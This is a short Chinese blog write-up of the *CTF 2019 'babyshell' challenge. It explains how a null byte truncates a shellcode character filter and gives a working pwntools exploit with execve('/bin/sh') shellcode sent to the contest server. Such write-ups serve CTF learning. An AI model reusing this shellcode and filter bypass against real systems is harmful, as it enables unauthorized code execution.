---
title: Starctf2019_Babyshell
date: 2019-04-29 10:52:49
tags:
---
挺有意思的一题...PPP太强了..
<!--more-->
# start
[binary][1]
一放题目没几分钟被ppp秒掉了...tql...
# analysis
一开始没仔细看以为是一题指定字符域的`shellcode`题和`pwnable.tw`上的`deathnote`,`alivenote`,`MnO2`挺像的...
后来发现好像检测的地方有点问题可以`\x00`截断
```arm
 for ( i = a1; *i; ++i )
  {
    for ( j = &asc; *j && *j != *i; ++j )
      ;
    if ( !*j )
      return 0LL;
  }
```
`*i`为0就退出了所以可以截断.
# 漏洞利用
通过已有的字符和`\x00`组成不会`crash`的`shellcod`然后写上`sh`的`shellcode`就可以了
# exp
```python
from pwn import *
context.log_level='debug'
context.arch='amd64'
#p=process('./shellcode')
#gdb.attach(p,'b *0x4008cb')
p=remote("34.92.37.22",10002)

sh='''
xor rax,rax
mov al,0x3b
xor rsi,rsi
xor rdi,rdi
xor rdx,rdx
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
syscall
'''
sh=asm(sh)
p.sendlineafter(":","\x00gs\njaZ"+sh)
p.interactive()
'''
[_]: pop rdi
[Z]: pop rdx
'''
```
[1]:https://github.com/n132/Watermalon/tree/master/Starctf_2019
